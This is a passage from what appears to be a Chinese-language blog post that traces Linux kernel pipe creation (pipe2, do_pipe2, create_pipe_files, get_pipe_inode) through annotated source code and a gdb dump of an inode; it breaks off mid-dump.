<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SYSCALL_DEFINE2</span>(pipe2, <span class="keyword">int</span> __user *, fildes, <span class="keyword">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">do_pipe2</span>(fildes, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">SYSCALL_DEFINE1</span>(pipe, <span class="keyword">int</span> __user *, fildes)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">do_pipe2</span>(fildes, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2、do-pipe2"><a href="#2、do-pipe2" class="headerlink" title="2、do_pipe2"></a>2、do_pipe2</h4><p>函数通过 <code>__do_pipe_flags</code> 创建了两个 <code>fd</code> 和两个 <code>file</code>，并通过<code>fd_install</code> 将其一一绑定。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sys_pipe() is the normal C calling standard for creating</span></span><br><span class="line"><span class="comment"> * a pipe. It&#x27;s not the way Unix traditionally does this, though.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_pipe2</span><span class="params">(<span class="keyword">int</span> __user *fildes, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">files</span>[2];</span></span><br><span class="line">	<span class="keyword">int</span> fd[<span class="number">2</span>];</span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line">	error = __do_pipe_flags(fd, files, flags);		<span class="comment">// 进入该函数</span></span><br><span class="line">	<span class="keyword">if</span> (!error) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">unlikely</span>(<span class="built_in">copy_to_user</span>(fildes, fd, <span class="built_in"><span class="keyword">sizeof</span></span>(fd)))) &#123;</span><br><span class="line">			<span class="built_in">fput</span>(files[<span class="number">0</span>]);</span><br><span class="line">			<span class="built_in">fput</span>(files[<span class="number">1</span>]);</span><br><span class="line">			<span class="built_in">put_unused_fd</span>(fd[<span class="number">0</span>]);</span><br><span class="line">			<span class="built_in">put_unused_fd</span>(fd[<span class="number">1</span>]);</span><br><span class="line">			error = -EFAULT;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">fd_install</span>(fd[<span class="number">0</span>], files[<span class="number">0</span>]);		<span class="comment">// fd_install ：在 fd 数组中安装一个文件指针 rcu_assign_pointer(fdt-&gt;fd[fd], file);</span></span><br><span class="line">			<span class="built_in">fd_install</span>(fd[<span class="number">1</span>], files[<span class="number">1</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3、-do-pipe-flags"><a href="#3、-do-pipe-flags" class="headerlink" title="3、__do_pipe_flags"></a>3、__do_pipe_flags</h4><p>查看<code>__do_pipe_flags</code>，第一个参数 <code>fd</code> 用于保存创建的两个文件描述符，第二个参数用于保存创建的两个 <code>struct file</code> 结构体实例，第三个参数是系统调用参数 <code>flags</code> 的值。</p>
<p>该函数被<code>do_pipe2</code>调用，创建了两个 <code>files</code> 结构，并初始化了两个文件描述符 <code>fd</code>。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __do_pipe_flags(<span class="keyword">int</span> *fd, struct file **files, <span class="keyword">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line">	<span class="keyword">int</span> fdw, fdr;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; ~(O_CLOEXEC | O_NONBLOCK | O_DIRECT | O_NOTIFICATION_PIPE))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	error = <span class="built_in">create_pipe_files</span>(files, flags);			<span class="comment">// 在调试时很奇怪的直接跳转到 get_pipe_inode 函数中了</span></span><br><span class="line">	<span class="keyword">if</span> (error)</span><br><span class="line">		<span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">	error = <span class="built_in">get_unused_fd_flags</span>(flags);				<span class="comment">// 获取读的文件描述符</span></span><br><span class="line">	<span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> err_read_pipe;</span><br><span class="line">	fdr = error;</span><br><span class="line"></span><br><span class="line">	error = <span class="built_in">get_unused_fd_flags</span>(flags);				<span class="comment">// 获取写的文件描述符</span></span><br><span class="line">	<span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> err_fdr;</span><br><span class="line">	fdw = error;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">audit_fd_pair</span>(fdr, fdw);								<span class="comment">// 这里对两个文件描述符进行审计</span></span><br><span class="line">	fd[<span class="number">0</span>] = fdr;</span><br><span class="line">	fd[<span class="number">1</span>] = fdw;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> err_fdr:</span><br><span class="line">	<span class="built_in">put_unused_fd</span>(fdr);</span><br><span class="line"> err_read_pipe:</span><br><span class="line">	<span class="built_in">fput</span>(files[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">fput</span>(files[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4、create-pipe-files"><a href="#4、create-pipe-files" class="headerlink" title="4、create_pipe_files"></a>4、create_pipe_files</h4><p>该函数被<code>__do_pipe_flags</code>调用，传入了file结构体指针类型的 <code>res</code>对象，并通过传入的 <code>flag</code>标志位生成两个 <code>file</code> 类型的对象，之后将 <code>res[0]</code> 与 <code>res[1]</code> 分别指向这两个对象。</p>
<p>该函数的大体逻辑为：首先通过 <code>get_pipe_inode</code> 新创建一个<code>inode</code> 对象，之后通过 <code>alloc_file_pseudo</code> 创建一个 <code>file</code> 对象，之后通过 <code>alloc_file_clone</code> 克隆刚刚生成的 <code>file</code> 对象，之后将两个<code>file</code> 对象的 <code>private_data</code> 成员设置为 <code>inode-&gt;i_pipe</code> ，而这个 <code>inode-&gt;i_pipe</code> 就是下面介绍的 <code>alloc_pipe_info</code> 生成的对象。最后调用 <code>stream_open</code> 将<code>res[0]</code> 与 <code>res[1]</code> 分别传入，打开两个文件流，具体 <code>inode</code> 在 <code>stream_open</code> 中起到的作用不清楚。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_pipe_files</span><span class="params">(struct file **res, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> <span class="built_in">get_pipe_inode</span>();				<span class="comment">// 创建一个 inode 对象。</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span>;</span></span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!inode)</span><br><span class="line">		<span class="keyword">return</span> -ENFILE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; O_NOTIFICATION_PIPE) &#123;			<span class="comment">// #define O_NOTIFICATION_PIPE	O_EXCL	/* Parameter to pipe2() selecting notification pipe */</span></span><br><span class="line">		error = <span class="built_in">watch_queue_init</span>(inode-&gt;i_pipe);</span><br><span class="line">		<span class="keyword">if</span> (error) &#123;</span><br><span class="line">			<span class="built_in">free_pipe_info</span>(inode-&gt;i_pipe);</span><br><span class="line">			<span class="built_in">iput</span>(inode);</span><br><span class="line">			<span class="keyword">return</span> error;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	f = <span class="built_in">alloc_file_pseudo</span>(inode, pipe_mnt, <span class="string">&quot;&quot;</span>,					</span><br><span class="line">				O_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)),</span><br><span class="line">				&amp;pipefifo_fops);			<span class="comment">// 分配了struct file的堆空间，调用了 alloc_file 函数，经过多次套娃，发现最终调用的是 kmem_cache_alloc 函数。可见随着累年的发展，linux 中间接口也在不断的增加。</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">IS_ERR</span>(f)) &#123;						<span class="comment">// 这里如果 f 分配失败则会释放之前申请的 pipe_buffer，并减少 inode 的引用计数，iput 的作用是减少 inode 的引用计数</span></span><br><span class="line">		<span class="built_in">free_pipe_info</span>(inode-&gt;i_pipe);</span><br><span class="line">		<span class="built_in">iput</span>(inode);</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">PTR_ERR</span>(f);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	f-&gt;private_data = inode-&gt;i_pipe;		<span class="comment">// 这里将	pipe_buffer 赋值给 f-&gt;private_data</span></span><br><span class="line"></span><br><span class="line">	res[<span class="number">0</span>] = <span class="built_in">alloc_file_clone</span>(f, O_RDONLY | (flags &amp; O_NONBLOCK),	</span><br><span class="line">				  &amp;pipefifo_fops);				<span class="comment">// 拷贝一份之前生成的 f 的对象</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">IS_ERR</span>(res[<span class="number">0</span>])) &#123;</span><br><span class="line">		<span class="built_in">put_pipe_info</span>(inode, inode-&gt;i_pipe);	</span><br><span class="line">		<span class="built_in">fput</span>(f);</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">PTR_ERR</span>(res[<span class="number">0</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	res[<span class="number">0</span>]-&gt;private_data = inode-&gt;i_pipe;</span><br><span class="line">	res[<span class="number">1</span>] = f;</span><br><span class="line">	<span class="built_in">stream_open</span>(inode, res[<span class="number">0</span>]);						<span class="comment">// 看了下源码，代码中没用到 inode ，不知道有什么用</span></span><br><span class="line">	<span class="built_in">stream_open</span>(inode, res[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是 <code>stream_open</code> 的源码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * stream_open is used by subsystems that want stream-like file descriptors.</span></span><br><span class="line"><span class="comment"> * Such file descriptors are not seekable and don&#x27;t have notion of position</span></span><br><span class="line"><span class="comment"> * (file.f_pos is always 0 and ppos passed to .read()/.write() is always NULL).</span></span><br><span class="line"><span class="comment"> * Contrary to file descriptors of other regular files, .read() and .write()</span></span><br><span class="line"><span class="comment"> * can run simultaneously.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * stream_open never fails and is marked to return int so that it could be</span></span><br><span class="line"><span class="comment"> * directly used as file_operations.open .</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">stream_open</span><span class="params">(struct inode *inode, struct file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	filp-&gt;f_mode &amp;= ~(FMODE_LSEEK | FMODE_PREAD | FMODE_PWRITE | FMODE_ATOMIC_POS);</span><br><span class="line">	filp-&gt;f_mode |= FMODE_STREAM;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="5、get-pipe-inode"><a href="#5、get-pipe-inode" class="headerlink" title="5、get_pipe_inode()"></a>5、get_pipe_inode()</h4><p>该函数被<code>create_pipe_files</code>调用，用于生成一个inode，且该inode只用于管道。</p>
<p>该函数的大体逻辑为：首先通过 <code>new_inode_pseudo</code> 新创建一个<code>inode</code> 对象，之后通过 <code>alloc_pipe_info</code> 创建一个 <code>pipe</code> 对象，之后inode-&gt;i_pipe = pipe。函数的后面初始化<code>inode</code> 对象的其他属性，并进行一系列异常处理。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct inode * <span class="title">get_pipe_inode</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> <span class="built_in">new_inode_pseudo</span>(pipe_mnt-&gt;mnt_sb);			<span class="comment">// 获取一个 inode 。 为给定的 superblock 分配一个新的 inode。 inode 不会被链接到 superblock s_inodes 列表中。这意味着 fs 不能卸载，quotas, fsnotify, writeback 均不能工作。 // mnt_sb 是指向 superblock 的指针。</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!inode)</span><br><span class="line">		<span class="keyword">goto</span> fail_inode;</span><br><span class="line"></span><br><span class="line">	inode-&gt;i_ino = <span class="built_in">get_next_ino</span>();		<span class="comment">// /* ino:  Stat data, not accessed from path walking */		</span></span><br><span class="line"></span><br><span class="line">	pipe = <span class="built_in">alloc_pipe_info</span>();			<span class="comment">// 见 8</span></span><br><span class="line">	<span class="keyword">if</span> (!pipe)</span><br><span class="line">		<span class="keyword">goto</span> fail_iput;</span><br><span class="line"></span><br><span class="line">	inode-&gt;i_pipe = pipe;			<span class="comment">// 从这到下面都是给inode进行初始化了</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    	实际上inode-&gt;i_pipe 是个联合体成员，它不一定是 i_pipe，而一旦是i_pipe，则代表该inode只用于管道，inode 实际上相当于一个常用的数据结构，inode 常常用于 mostly read-only and often accessed 的数据结构。</span></span><br><span class="line"><span class="comment">    	union &#123;</span></span><br><span class="line"><span class="comment">		struct pipe_inode_info	*i_pipe;</span></span><br><span class="line"><span class="comment">		struct cdev		*i_cdev;</span></span><br><span class="line"><span class="comment">		char			*i_link;</span></span><br><span class="line"><span class="comment">		unsigned		i_dir_seq;</span></span><br><span class="line"><span class="comment">	&#125;;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	pipe-&gt;files = <span class="number">2</span>;</span><br><span class="line">	pipe-&gt;readers = pipe-&gt;writers = <span class="number">1</span>;</span><br><span class="line">	inode-&gt;i_fop = &amp;pipefifo_fops;			<span class="comment">// 见9</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Mark the inode dirty from the very beginning,</span></span><br><span class="line"><span class="comment">	 * that way it will never be moved to the dirty</span></span><br><span class="line"><span class="comment">	 * list because &quot;mark_inode_dirty()&quot; will think</span></span><br><span class="line"><span class="comment">	 * that it already _is_ on the dirty list.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	inode-&gt;i_state = I_DIRTY;</span><br><span class="line">	inode-&gt;i_mode = S_IFIFO | S_IRUSR | S_IWUSR;</span><br><span class="line">	inode-&gt;i_uid = <span class="built_in">current_fsuid</span>();</span><br><span class="line">	inode-&gt;i_gid = <span class="built_in">current_fsgid</span>();</span><br><span class="line">	inode-&gt;i_atime = inode-&gt;i_mtime = inode-&gt;i_ctime = <span class="built_in">current_time</span>(inode);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> inode;</span><br><span class="line"></span><br><span class="line">fail_iput:</span><br><span class="line">	<span class="built_in">iput</span>(inode);</span><br><span class="line"></span><br><span class="line">fail_inode:</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">下面是该函数返回值，也就是inode，实际上inode我们不需要太过关心</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">gef➤  print *inode</span></span><br><span class="line"><span class="comment">$7 = &#123;</span></span><br><span class="line"><span class="comment">  i_mode = 0x1180,</span></span><br><span class="line"><span class="comment">  i_opflags = 0x0,</span></span><br><span class="line"><span class="comment">  i_uid = &#123;</span></span><br><span class="line"><span class="comment">    val = 0x3e8</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_gid = &#123;</span></span><br><span class="line"><span class="comment">    val = 0x3e8</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_flags = 0x0,</span></span><br><span class="line"><span class="comment">  i_acl = 0xffffffffffffffff,</span></span><br><span class="line"><span class="comment">  i_default_acl = 0xffffffffffffffff,</span></span><br><span class="line"><span class="comment">  i_op = 0xffffffff8201a280 &lt;empty_iops&gt;,</span></span><br><span class="line"><span class="comment">  i_sb = 0xffff888003057800,</span></span><br><span class="line"><span class="comment">  i_mapping = 0xffff888005315128,</span></span><br><span class="line"><span class="comment">  i_security = 0xffff88800643db60,</span></span><br><span class="line"><span class="comment">  i_ino = 0x293f,</span></span><br><span class="line"><span class="comment">  &#123;</span></span><br><span class="line"><span class="comment">    i_nlink = 0x1,</span></span><br><span class="line"><span class="comment">    __i_nlink = 0x1</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_rdev = 0x0,</span></span><br><span class="line"><span class="comment">  i_size = 0x0,</span></span><br><span class="line"><span class="comment">  i_atime = &#123;</span></span><br><span class="line"><span class="comment">    tv_sec = 0x62340101,</span></span><br><span class="line"><span class="comment">    tv_nsec = 0x1161f975</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_mtime = &#123;</span></span><br><span class="line"><span class="comment">    tv_sec = 0x62340101,</span></span><br><span class="line"><span class="comment">    tv_nsec = 0x1161f975</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_ctime = &#123;</span></span><br><span class="line"><span class="comment">    tv_sec = 0x62340101,</span></span><br><span class="line"><span class="comment">    tv_nsec = 0x1161f975</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_lock = &#123;</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      rlock = &#123;</span></span><br><span class="line"><span class="comment">        raw_lock = &#123;</span></span><br><span class="line"><span class="comment">          &#123;</span></span><br><span class="line"><span class="comment">            val = &#123;</span></span><br><span class="line"><span class="comment">              counter = 0x0</span></span><br><span class="line"><span class="comment">            &#125;,</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">              locked = 0x0,</span></span><br><span class="line"><span class="comment">              pending = 0x0</span></span><br><span class="line"><span class="comment">            &#125;,</span></span><br><span class="line"><span class="comment">            &#123;</span></span><br><span class="line"><span class="comment">              locked_pending = 0x0,</span></span><br><span class="line"><span class="comment">              tail = 0x0</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">          &#125;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  &#125;,</span></span><br><span class="line"><span class="comment">  i_bytes = 0x0,</span></span><br><span class="line"><span class="comment">  i_blkbits = 0xc,</span></span><br><span class="line"><span class="comment">  i_write_hint = 0x0,</span></span><br><span class="line"><span class="comment">  i_blocks = 0x0,</span></span><br><span class="line"><span class="comment">  i_state = 